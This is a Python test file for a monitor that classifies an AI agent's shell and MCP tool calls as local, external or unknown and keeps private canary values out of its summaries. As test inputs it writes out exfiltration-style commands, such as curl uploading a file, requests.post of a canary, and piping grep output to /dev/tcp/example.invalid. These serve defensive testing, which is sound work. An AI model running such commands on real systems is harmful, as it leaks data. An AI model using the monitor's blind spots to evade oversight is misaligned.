from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from hook_monitor.externality.envelope import (
    analyze_bash_externality,
    analyze_mcp_externality,
)


class ExternalityStaticAnalysisTest(unittest.TestCase):
    def test_known_external_and_local_commands_are_distinguished(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            external = analyze_bash_externality(
                "curl --data-binary @report.txt https://example.invalid",
                workspace_root=root,
            )
            local = analyze_bash_externality("rg -n TODO .", workspace_root=root)

        self.assertEqual("external", external.verdict)
        self.assertEqual(("http",), external.envelope.capabilities)
        self.assertEqual("local", local.verdict)
        self.assertEqual((), local.envelope.capabilities)

    def test_python_inline_source_is_analyzed_but_never_serialized(self) -> None:
        protected_canary = "PRIVATE_RESEARCH_CANARY_91b70d"
        command = (
            "python -c \"import requests; "
            f"requests.post('https://example.invalid', data='{protected_canary}')\""
        )
        with tempfile.TemporaryDirectory() as temporary_directory:
            result = analyze_bash_externality(
                command,
                workspace_root=Path(temporary_directory),
            )

        serialized = result.envelope.canonical_json()
        self.assertEqual("external", result.verdict)
        self.assertIn("http", result.envelope.capabilities)
        self.assertIn("inline_program", result.envelope.risk_signals)
        self.assertNotIn(protected_canary, serialized)
        self.assertNotIn("example.invalid", serialized)
        self.assertNotIn("requests", serialized)

    def test_workspace_python_script_is_bounded_and_value_free(self) -> None:
        protected_canary = "PRIVATE_SCRIPT_CANARY_f20b6c"
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            script = root / "private_client.py"
            script.write_text(
                "import socket\n"
                f"value = '{protected_canary}'\n"
                "socket.socket()\n",
                encoding="utf-8",
            )

            result = analyze_bash_externality(
                "python private_client.py",
                workspace_root=root,
            )

        self.assertEqual("external", result.verdict)
        self.assertIn("socket", result.envelope.capabilities)
        self.assertEqual(1, dict(result.envelope.counts)["script_file_count"])
        self.assertNotIn(protected_canary, result.envelope.canonical_json())
        self.assertNotIn("private_client", result.envelope.canonical_json())

    def test_multiline_shell_script_finds_network_capability_without_serializing(self) -> None:
        protected_canary = "PRIVATE_SHELL_CANARY_741c6b"
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            script = root / "run.sh"
            script.write_text(
                "#!/bin/sh\n"
                f"value='{protected_canary}'\n"
                "curl https://example.invalid\n",
                encoding="utf-8",
            )
            result = analyze_bash_externality("sh run.sh", workspace_root=root)

        self.assertEqual("external", result.verdict)
        self.assertIn("http", result.envelope.capabilities)
        self.assertEqual("partial", result.envelope.analysis_coverage)
        self.assertNotIn(protected_canary, result.envelope.canonical_json())

    def test_unknown_and_dynamic_shell_are_not_classified_local(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            unknown = analyze_bash_externality("./custom-agent --run", workspace_root=root)
            dynamic = analyze_bash_externality("$RUNNER --run", workspace_root=root)

        self.assertEqual("unknown", unknown.verdict)
        self.assertEqual("opaque", unknown.envelope.analysis_coverage)
        self.assertEqual("unknown", dynamic.verdict)
        self.assertIn("dynamic_shell_token", dynamic.envelope.risk_signals)

    def test_execution_capable_or_untrusted_local_names_are_not_local(self) -> None:
        commands = (
            "find . -exec curl https://example.invalid ;",
            "awk 'BEGIN { system(\"curl https://example.invalid\") }'",
            "sort --compress-program=./opaque report.txt",
            "pytest -q",
            "./rg TODO .",
            "MODE=local rg TODO .",
        )
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            results = [
                analyze_bash_externality(command, workspace_root=root)
                for command in commands
            ]

        self.assertTrue(all(result.verdict != "local" for result in results))

    def test_network_device_redirection_is_external(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            result = analyze_bash_externality(
                "rg PRIVATE . > /dev/tcp/example.invalid/443",
                workspace_root=Path(temporary_directory),
            )

        self.assertEqual("external", result.verdict)
        self.assertIn("socket", result.envelope.capabilities)

    def test_unrecognized_python_or_node_program_is_not_proven_local(self) -> None:
        commands = (
            "python -c 'print(1)'",
            "node -e 'console.log(1)'",
        )
        with tempfile.TemporaryDirectory() as temporary_directory:
            results = [
                analyze_bash_externality(
                    command,
                    workspace_root=Path(temporary_directory),
                )
                for command in commands
            ]

        self.assertTrue(all(result.verdict == "unknown" for result in results))

    def test_script_outside_workspace_is_not_read(self) -> None:
        with tempfile.TemporaryDirectory() as first, tempfile.TemporaryDirectory() as second:
            root = Path(first)
            outside = Path(second) / "outside.py"
            outside.write_text("import requests\n", encoding="utf-8")
            result = analyze_bash_externality(
                f"python {outside}",
                workspace_root=root,
            )

        self.assertEqual("unknown", result.verdict)
        self.assertIn("outside_workspace_reference", result.envelope.risk_signals)
        self.assertNotIn("requests", result.envelope.canonical_json())

    def test_mcp_summary_does_not_include_tool_or_argument_values(self) -> None:
        payload = {"body": "PRIVATE_MCP_CANARY", "repository": "secret/repo"}
        result = analyze_mcp_externality("mcp__github__create_issue", payload)
        serialized = json.dumps(result.envelope.to_dict(), sort_keys=True)

        self.assertEqual("external", result.verdict)
        self.assertEqual(("mcp_mutation",), result.envelope.capabilities)
        self.assertNotIn("github", serialized)
        self.assertNotIn("create_issue", serialized)
        self.assertNotIn("PRIVATE_MCP_CANARY", serialized)


if __name__ == "__main__":
    unittest.main()
